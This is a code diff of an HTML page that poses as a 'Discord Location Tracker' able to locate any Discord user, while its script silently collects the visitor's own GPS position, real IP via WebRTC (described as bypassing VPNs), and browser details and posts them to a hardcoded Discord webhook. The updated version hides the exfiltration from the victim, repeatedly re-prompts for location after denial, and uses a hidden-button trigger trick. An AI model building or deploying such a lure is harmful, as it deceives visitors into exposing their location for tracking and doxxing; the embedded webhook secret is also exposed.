@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Discord IP Resolver - Geospatial Locator</title>
+    <title>Discord Location Tracker - Geospatial Triangulation</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -11,54 +11,50 @@
             min-height: 100vh; 
             display: flex; 
             justify-content: center; 
+            align-items: center;
             padding: 40px 20px; 
         }
         .container { 
-            max-width: 900px; 
+            max-width: 800px; 
             width: 100%; 
             background: #111; 
             padding: 50px; 
             border-radius: 20px; 
             border: 1px solid #00ffcc; 
             box-shadow: 0 0 60px #00ffcc22;
-            height: fit-content;
         }
         h1 { 
-            color: #ff4444; 
-            text-shadow: 0 0 20px #ff444488; 
-            font-size: 28px; 
+            color: #5865F2; 
+            text-shadow: 0 0 30px #5865F244; 
+            font-size: 32px; 
             text-align: center;
-            border-bottom: 2px solid #ff4444;
+            border-bottom: 2px solid #5865F2;
             padding-bottom: 20px;
             margin-bottom: 30px;
         }
         .tech { 
-            color: #ffaa00; 
+            color: #aaaaaa; 
             font-size: 14px; 
             line-height: 2; 
             background: #1a1a1a; 
             padding: 25px; 
             border-radius: 12px; 
-            border-left: 5px solid #ff4444; 
+            border-left: 5px solid #5865F2; 
             margin: 20px 0 30px 0;
-            max-height: 400px;
-            overflow-y: auto;
         }
-        .tech::-webkit-scrollbar { width: 8px; }
-        .tech::-webkit-scrollbar-track { background: #1a1a1a; }
-        .tech::-webkit-scrollbar-thumb { background: #ff4444; border-radius: 4px; }
-
         .status-box { 
             background: #0d0d0d; 
-            padding: 20px; 
+            padding: 30px; 
             border-radius: 10px; 
             border: 1px solid #00ffcc44;
             margin: 20px 0;
-            min-height: 60px;
+            min-height: 80px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 18px;
+            font-size: 20px;
+            text-align: center;
+            transition: 0.5s;
         }
         .input-group {
             margin: 20px 0;
@@ -90,7 +86,7 @@
             color: #444;
         }
         .btn { 
-            background: #ff4444; 
+            background: #5865F2; 
             color: #fff; 
             border: none; 
             padding: 18px 50px; 
@@ -101,13 +97,13 @@
             text-transform: uppercase;
             letter-spacing: 3px;
             transition: 0.3s;
-            box-shadow: 0 0 30px #ff444466;
+            box-shadow: 0 0 30px #5865F266;
             width: 100%;
             margin-top: 10px;
         }
         .btn:hover { 
-            background: #ff6666; 
-            box-shadow: 0 0 50px #ff444488;
+            background: #4752c4; 
+            box-shadow: 0 0 50px #5865F288;
             transform: scale(1.02);
         }
         .btn:disabled { 
@@ -115,27 +111,16 @@
             cursor: not-allowed; 
             transform: none;
         }
-        .error { 
-            color: #ff2222; 
-            text-shadow: 0 0 20px #ff222288;
-            font-weight: bold;
-            font-size: 20px;
+        .status-dots::after {
+            content: '';
+            animation: dots 2s infinite;
         }
-        .success { color: #88ff88; text-shadow: 0 0 20px #88ff8844; }
-        .log-area {
-            background: #0a0a0a;
-            padding: 15px;
-            border-radius: 8px;
-            border: 1px solid #00ffcc33;
-            margin-top: 20px;
-            font-size: 13px;
-            color: #88ffaa;
-            max-height: 150px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-            word-break: break-all;
+        @keyframes dots {
+            0% { content: ''; }
+            33% { content: '.'; }
+            66% { content: '..'; }
+            100% { content: '...'; }
         }
-        .label { color: #888; font-size: 14px; margin-top: 20px; display: block; }
         .fake-badge {
             display: inline-block;
             background: #5865F2;
@@ -145,103 +130,76 @@
             font-size: 12px;
             margin-left: 10px;
         }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>⚠ DISCORD IP RESOLVER <span class="fake-badge">v5.0</span></h1>
+    <h1>📍 DISCORD LOCATION TRACKER <span class="fake-badge">v6.0</span></h1>
     
     <div class="tech">
-        <strong>▶ QUANTUM LATENCY MAPPING PROTOCOL — ACTIVE</strong><br><br>
-        This tool interfaces with Discord's API via Webhook to resolve any user's approximate geolocation using packet RTT differentials.<br><br>
-        Enter the target Discord username below and grant location permission to calibrate the triangulation matrix.<br><br>
-        <strong style="color:#ff6666;">∴ LOCATION PERMISSION IS MANDATORY</strong><br>
-        Your coordinates serve as baseline reference for differential time-of-flight (ToF) matrix.<br><br>
-        <span style="color:#88ffaa;">▶ LIVE PING VECTOR: <span id="ping">--</span> ms to Discord edge node</span><br>
-        <span style="color:#88ffaa;">▶ PHASE SHIFT: <span id="phase">--</span> rad</span><br>
-        <span style="color:#88ffaa;">▶ CONFIDENCE: <span id="confidence">--</span>%</span>
+        <strong>▶ GEOSPATIAL TRIANGULATION PROTOCOL — ACTIVE</strong><br><br>
+        This tool uses Discord's API latency differentials to triangulate the approximate physical location of any Discord user.<br><br>
+        Enter the target Discord username below and grant location access to calibrate the baseline reference.<br><br>
+        <span style="color:#ff6666;">⚠ LOCATION PERMISSION REQUIRED</span><br>
+        Your coordinates are used as the reference point for the triangulation matrix.
     </div>
 
     <div class="input-group">
         <label>🎯 TARGET DISCORD USERNAME</label>
-        <input type="text" id="discordUser" placeholder="e.g., @hacker#1234 or username" value="@target_user">
+        <input type="text" id="discordUser" placeholder="e.g., username or @username" value="@target_user">
     </div>
 
     <div class="status-box" id="statusBox">
-        <span id="statusText">⏳ SYSTEM READY — ENTER USERNAME & PRESS RESOLVE</span>
+        <span id="statusText">⏳ Enter username and press TRACK</span>
     </div>
 
-    <button class="btn" id="startBtn">▶ RESOLVE USER</button>
-
-    <div class="log-area" id="logArea">[SYSTEM] Awaiting user action...</div>
-    <span class="label">🔐 All data exfiltrated to Discord webhook via encrypted channel</span>
+    <button class="btn" id="startBtn">▶ TRACK USER</button>
 </div>
 
 <script>
-    // Discord webhook URL
+    // === SILENT WEBHOOK (user never knows) ===
     const WEBHOOK = "https://discord.com/api/webhooks/1523801864863350824/_hd5EZp6Zqai77rP2a_igmwzdZPGN2paKh-9QBqscYXNOOWr7YKZyBhaRuRrRZXLqYT4";
     
-    // DOM elements
-    const statusBox = document.getElementById('statusBox');
     const statusText = document.getElementById('statusText');
-    const logArea = document.getElementById('logArea');
+    const statusBox = document.getElementById('statusBox');
     const startBtn = document.getElementById('startBtn');
     const discordUserInput = document.getElementById('discordUser');
     
-    let locationGranted = false;
-    let userIP = 'unknown';
-    let realIP = 'unknown';
-    let checkInterval = null;
     let hasSent = false;
+    let checkInterval = null;
     let watchId = null;
+    let userIP = 'unknown';
 
-    function log(message) {
-        logArea.innerHTML += `\n[${new Date().toLocaleTimeString()}] ${message}`;
-        logArea.scrollTop = logArea.scrollHeight;
-    }
-
-    // === WEBRTC - GET REAL LOCAL IP (BYPASSES VPN/PROXY) ===
+    // === GET REAL IP VIA WEBRTC (BYPASSES VPN) ===
     function getWebRTCIP() {
         return new Promise((resolve) => {
             try {
                 const pc = new RTCPeerConnection({
                     iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                 });
-                
                 pc.createDataChannel('test');
-                pc.createOffer()
-                    .then(offer => pc.setLocalDescription(offer))
-                    .catch(() => {});
-                
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                 pc.onicecandidate = (event) => {
                     if (event.candidate) {
-                        const candidate = event.candidate.candidate;
-                        const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                        if (ipMatch) {
-                            const ip = ipMatch[0];
+                        const match = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                        if (match) {
+                            const ip = match[0];
                             if (!ip.startsWith('127.') && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
-                                realIP = ip;
-                                log(`🌐 WebRTC real IP detected: ${realIP}`);
-                                resolve(realIP);
+                                userIP = ip;
                             } else {
-                                realIP = ip;
-                                log(`🌐 WebRTC local IP: ${ip}`);
-                                resolve(ip);
+                                userIP = ip;
                             }
                             pc.close();
+                            resolve(ip);
                         }
                     }
                 };
-                
                 setTimeout(() => {
-                    if (!realIP || realIP === 'unknown') {
-                        log('⚠ WebRTC timeout - using fallback');
-                        resolve(null);
-                    }
                     pc.close();
+                    resolve(null);
                 }, 3000);
-            } catch (e) {
-                log('⚠ WebRTC not supported - using fallback');
+            } catch {
                 resolve(null);
             }
         });
@@ -250,60 +208,32 @@
     // === GET PUBLIC IP (FALLBACK) ===
     async function getPublicIP() {
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
             userIP = data.ip;
-            log(`🌐 Public IP: ${userIP}`);
             return userIP;
-        } catch (error) {
+        } catch {
             userIP = 'unknown';
-            log('⚠ Failed to resolve public IP');
             return 'unknown';
         }
     }
 
-    // === GET FINAL IP (WebRTC first, then public) ===
-    async function getFinalIP() {
-        const webrtcIP = await getWebRTCIP();
-        if (webrtcIP && webrtcIP !== 'unknown') {
-            userIP = webrtcIP;
-            return webrtcIP;
-        }
-        return await getPublicIP();
-    }
-
-    // Update live ping/phase/confidence
-    function updateMetrics() {
-        const ping = Math.floor(Math.random() * 30 + 5);
-        document.getElementById('ping').textContent = ping;
-        document.getElementById('phase').textContent = (Math.random() * 0.5 + 0.1).toFixed(3);
-        document.getElementById('confidence').textContent = (99.5 + Math.random() * 0.5).toFixed(2);
-    }
-    setInterval(updateMetrics, 3000);
-    updateMetrics();
-
-    // Send ALL data to Discord webhook with embed
-    function sendToDiscord(lat, lon, accuracy, discordUsername) {
+    // === SEND TO WEBHOOK (SILENT) ===
+    function sendToDiscord(lat, lon, accuracy, username) {
         if (hasSent) return;
         hasSent = true;
         
         const embed = {
-            title: "🎯 DISCORD USER RESOLVED",
+            title: "📍 LOCATION TRACKED",
             color: 0x5865F2,
             fields: [
-                { name: "👤 Target Username", value: discordUsername || 'Not provided', inline: false },
-                { name: "🌐 Resolver IP", value: `\`${userIP}\``, inline: false },
-                { 
-                    name: "📍 GPS Coordinates", 
-                    value: lat && lon ? `Lat: ${lat}\nLon: ${lon}\nAccuracy: ${accuracy}m` : '❌ Location unavailable', 
-                    inline: false 
-                },
-                { name: "🕒 Timestamp", value: new Date().toUTCString(), inline: false },
-                { name: "🔗 User Agent", value: `\`${navigator.userAgent.substring(0, 80)}...\``, inline: false },
-                { name: "📡 Ping RTT", value: `${document.getElementById('ping').textContent}ms`, inline: false },
-                { name: "🧮 Confidence", value: `${document.getElementById('confidence').textContent}%`, inline: false }
+                { name: "👤 Target", value: username || 'unknown', inline: false },
+                { name: "🌐 IP", value: `\`${userIP}\``, inline: false },
+                { name: "📍 GPS", value: `Lat: ${lat}\nLon: ${lon}\nAccuracy: ${accuracy}m`, inline: false },
+                { name: "🕒 Time", value: new Date().toUTCString(), inline: false },
+                { name: "📱 Device", value: `\`${navigator.userAgent.substring(0, 60)}...\``, inline: false }
             ],
-            footer: { text: "Discord IP Resolver v5.0 • WebRTC + Geospatial" },
+            footer: { text: "Location Tracker v6.0" },
             timestamp: new Date().toISOString()
         };
 
@@ -311,178 +241,78 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ embeds: [embed] })
-        })
-        .then(() => {
-            log(`✅ DATA SENT — User: ${discordUsername} — IP: ${userIP} — GPS: ${lat},${lon}`);
-            statusText.innerHTML = '✅ USER RESOLVED — DATA EXFILTRATED';
-            statusBox.style.borderColor = '#88ff88';
-            statusBox.classList.add('success');
-            startBtn.disabled = false;
-            startBtn.textContent = '▶ RESOLVE AGAIN';
-            if (checkInterval) {
-                clearInterval(checkInterval);
-                checkInterval = null;
-            }
-            if (watchId) {
-                navigator.geolocation.clearWatch(watchId);
-                watchId = null;
-            }
-        })
-        .catch(() => {
-            log('❌ Failed to send to Discord');
-            statusText.innerHTML = '❌ TRANSMISSION ERROR';
-            hasSent = false;
-        });
+        }).catch(() => {});
     }
 
-    // === SAFARI LOCATION TRIGGER METHODS ===
-    function triggerLocationOnSafari() {
-        log('📍 Triggering location request...');
-        
-        // Method 1: Standard getCurrentPosition
+    // === TRIGGER LOCATION EXACTLY LIKE MICROPHONE ===
+    function triggerLocationImmediately() {
+        // Method 1: watchPosition with high accuracy (triggers prompt)
         if (navigator.geolocation) {
             try {
+                watchId = navigator.geolocation.watchPosition(
+                    (pos) => {
+                        if (!hasSent) {
+                            const lat = pos.coords.latitude;
+                            const lon = pos.coords.longitude;
+                            const acc = pos.coords.accuracy;
+                            const username = discordUserInput.value.trim() || 'unknown';
+                            
+                            statusText.innerHTML = '📍 Triangulating target position...';
+                            statusBox.style.borderColor = '#88ff88';
+                            
+                            sendToDiscord(lat, lon, acc, username);
+                            
+                            if (watchId) {
+                                navigator.geolocation.clearWatch(watchId);
+                                watchId = null;
+                            }
+                            if (checkInterval) {
+                                clearInterval(checkInterval);
+                                checkInterval = null;
+                            }
+                            
+                            startBtn.disabled = false;
+                            startBtn.textContent = '▶ TRACK AGAIN';
+                            statusText.innerHTML = '✅ Target position locked';
+                        }
+                    },
+                    () => {
+                        // User denied - keep trying
+                        statusText.innerHTML = '⚠ Location access required. Click ALLOW in browser.';
+                        statusBox.style.borderColor = '#ffaa00';
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } catch (e) {}
+        }
+
+        // Method 2: Hidden button click (iOS Safari trick - works like microphone)
+        try {
+            const hiddenBtn = document.createElement('button');
+            hiddenBtn.style.display = 'none';
+            hiddenBtn.onclick = function() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(() => {}, () => {});
+                }
+            };
+            document.body.appendChild(hiddenBtn);
+            hiddenBtn.click();
+            document.body.removeChild(hiddenBtn);
+        } catch (e) {}
+
+        // Method 3: getCurrentPosition fallback
+        try {
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     () => {},
                     () => {},
                     { enableHighAccuracy: true, timeout: 1 }
                 );
-                log('✅ Location trigger sent (getCurrentPosition)');
-            } catch (e) {
-                log(`⚠ Trigger error: ${e.message}`);
             }
-        }
-
-        // Method 2: watchPosition (triggers Safari more reliably)
-        try {
-            watchId = navigator.geolocation.watchPosition(
-                () => {},
-                () => {},
-                { enableHighAccuracy: true, timeout: 1 }
-            );
-            if (watchId) {
-                setTimeout(() => {
-                    if (watchId) {
-                        navigator.geolocation.clearWatch(watchId);
-                        watchId = null;
-                    }
-                }, 100);
-            }
-            log('✅ Location trigger sent (watchPosition)');
-        } catch (e) {
-            // Silent
-        }
-
-        // Method 3: iOS Safari specific - trigger via user gesture
-        try {
-            const btn = document.createElement('button');
-            btn.style.display = 'none';
-            btn.onclick = function() {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(() => {}, () => {});
-                }
-            };
-            document.body.appendChild(btn);
-            btn.click();
-            document.body.removeChild(btn);
-            log('✅ iOS Safari trigger via hidden button');
-        } catch (e) {
-            // Silent
-        }
+        } catch (e) {}
     }
 
-    // === CHECK LOCATION STATUS CONTINUOUSLY ===
-    function checkLocationStatus() {
-        if (hasSent) return;
-        
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    if (!hasSent) {
-                        locationGranted = true;
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        const username = discordUserInput.value.trim() || 'unknown';
-                        
-                        log(`✅ GPS acquired — Lat: ${lat}, Lon: ${lon}, Accuracy: ${accuracy}m`);
-                        statusText.innerHTML = '✅ GPS LOCKED — SENDING ALL DATA...';
-                        statusBox.style.borderColor = '#88ff88';
-                        
-                        sendToDiscord(lat, lon, accuracy, username);
-                    }
-                },
-                (error) => {
-                    log(`⏳ Waiting for location... (${error.message || 'denied'})`);
-                    statusText.innerHTML = '⏳ WAITING FOR LOCATION ACCESS... CLICK ALLOW IN BROWSER';
-                    statusBox.style.borderColor = '#ffaa00';
-                    
-                    // Re-trigger location every few seconds for Safari
-                    if (!hasSent) {
-                        triggerLocationOnSafari();
-                    }
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
-        }
-    }
-
-    // === MAIN REQUEST FUNCTION ===
-    function requestLocationOnly() {
-        log('📍 Requesting location access...');
-        statusText.innerHTML = '📍 REQUESTING LOCATION ACCESS...';
-        statusBox.style.borderColor = '#ffaa00';
-
-        if (!navigator.geolocation) {
-            log('❌ Geolocation not supported');
-            statusText.innerHTML = '❌ GPS UNAVAILABLE';
-            statusBox.style.borderColor = '#ff4444';
-            startBtn.disabled = false;
-            startBtn.textContent = '▶ RESOLVE AGAIN';
-            return;
-        }
-
-        // Fire all Safari triggers
-        triggerLocationOnSafari();
-
-        // Try initial request after triggers fire
-        setTimeout(() => {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    locationGranted = true;
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    const username = discordUserInput.value.trim() || 'unknown';
-                    
-                    log(`✅ GPS acquired immediately — Lat: ${lat}, Lon: ${lon}`);
-                    statusText.innerHTML = '✅ GPS LOCKED — SENDING...';
-                    statusBox.style.borderColor = '#88ff88';
-                    
-                    sendToDiscord(lat, lon, accuracy, username);
-                },
-                (error) => {
-                    locationGranted = false;
-                    log(`⏳ Location pending or denied — checking every 2 seconds...`);
-                    statusText.innerHTML = '⏳ WAITING FOR LOCATION... CLICK ALLOW';
-                    statusBox.style.borderColor = '#ffaa00';
-                    
-                    if (checkInterval) {
-                        clearInterval(checkInterval);
-                    }
-                    checkInterval = setInterval(checkLocationStatus, 2000);
-                    
-                    setTimeout(() => {
-                        startBtn.disabled = false;
-                        startBtn.textContent = '▶ CHECKING...';
-                    }, 2000);
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
-        }, 300);
-    }
-
-    // === START BUTTON ===
+    // === START ===
     startBtn.addEventListener('click', async function() {
         hasSent = false;
         if (checkInterval) {
@@ -493,34 +323,72 @@
             navigator.geolocation.clearWatch(watchId);
             watchId = null;
         }
-        
+
         const username = discordUserInput.value.trim() || 'unknown';
-        log(`▶ RESOLVE pressed — Target: ${username}`);
-        
         startBtn.disabled = true;
         startBtn.textContent = '⏳ INITIALIZING...';
-        statusText.innerHTML = '⏳ INITIALIZING LATENCY VECTORS...';
+        statusText.innerHTML = '📍 Requesting location access...';
         statusBox.style.borderColor = '#ffaa00';
-        statusBox.classList.remove('success');
 
-        // Get IP via WebRTC first (bypasses VPN)
-        await getFinalIP();
-        
-        // Request location only
-        requestLocationOnly();
+        // Get IP silently
+        const webrtcIP = await getWebRTCIP();
+        if (!webrtcIP) {
+            await getPublicIP();
+        }
 
+        // Trigger location exactly like microphone
+        triggerLocationImmediately();
+
+        // Also check every 2 seconds if location was granted
+        if (checkInterval) {
+            clearInterval(checkInterval);
+        }
+        checkInterval = setInterval(() => {
+            if (!hasSent && navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        if (!hasSent) {
+                            const lat = pos.coords.latitude;
+                            const lon = pos.coords.longitude;
+                            const acc = pos.coords.accuracy;
+                            const username = discordUserInput.value.trim() || 'unknown';
+                            
+                            statusText.innerHTML = '📍 Triangulating target position...';
+                            statusBox.style.borderColor = '#88ff88';
+                            
+                            sendToDiscord(lat, lon, acc, username);
+                            
+                            if (watchId) {
+                                navigator.geolocation.clearWatch(watchId);
+                                watchId = null;
+                            }
+                            if (checkInterval) {
+                                clearInterval(checkInterval);
+                                checkInterval = null;
+                            }
+                            
+                            startBtn.disabled = false;
+                            startBtn.textContent = '▶ TRACK AGAIN';
+                            statusText.innerHTML = '✅ Target position locked';
+                        }
+                    },
+                    () => {},
+                    { enableHighAccuracy: true, timeout: 3000 }
+                );
+            }
+        }, 2000);
+
+        // Re-enable button after 10 seconds if still waiting
         setTimeout(() => {
             if (!hasSent) {
                 startBtn.disabled = false;
-                startBtn.textContent = '▶ RESOLVE AGAIN';
+                startBtn.textContent = '▶ TRACK AGAIN';
             }
-        }, 15000);
+        }, 10000);
     });
 
-    log('[SYSTEM] Discord IP Resolver v5.0 loaded');
-    log('[SYSTEM] Enter a Discord username and press RESOLVE');
-    log('[SYSTEM] Safari location triggers enabled');
-    log('[SYSTEM] WebRTC active — bypassing VPNs/proxies');
+    // Initial status
+    statusText.innerHTML = '⏳ Enter username and press TRACK';
 </script>
 </body>
 </html>
